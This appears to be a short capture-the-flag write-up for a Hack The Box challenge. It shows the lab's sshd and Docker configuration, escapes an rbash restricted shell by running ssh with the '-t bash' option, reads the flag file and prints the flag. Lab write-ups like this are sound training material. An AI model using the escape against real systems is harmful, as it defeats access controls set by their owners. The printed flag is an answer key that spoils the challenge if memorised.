# restricted

**SOLVED**

> You 're still trying to collect information for your research on the alien relic. 
> Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. 
> Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. 
> You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. 
> The software containing all these memories seems to be running on a restricted environment which limits your access. 
> Can you find a way to escape the restricted environment ?

```txt
# sshd_config

Match user restricted
    PermitEmptyPasswords yes
```

```txt
#Dockerfile

RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted

ENTRYPOINT ["/usr/sbin/sshd", "-D", "-o", "ListenAddress=0.0.0.0", "-p", "1337"]
```

```sh
ssh restricted@165.227.224.40 -p 30346
# can't use shell

ssh restricted@165.227.224.40 -p 30346 -t "bash"
# can run commands though; bash shell popped

cat /flag_8dpsy
```

`HTB{r35tr1ct10n5_4r3_p0w3r1355}`